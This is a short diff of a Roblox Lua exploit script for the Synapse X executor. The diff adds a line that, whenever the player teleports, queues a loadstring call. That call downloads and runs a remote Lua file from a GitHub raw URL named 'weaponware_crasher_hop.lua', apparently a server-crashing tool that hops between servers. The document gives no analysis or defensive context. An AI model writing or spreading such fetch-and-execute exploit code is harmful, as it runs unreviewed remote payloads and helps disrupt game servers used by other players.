@@ -32,6 +32,6 @@ local x = {}
 
 game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(State)
     if State == Enum.TeleportState.Started then
-        syn.queue_on_teleport("")
+        syn.queue_on_teleport('loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/goopsta/small_projects/main/weaponware_crasher_hop.lua"))()')
     end
 end)
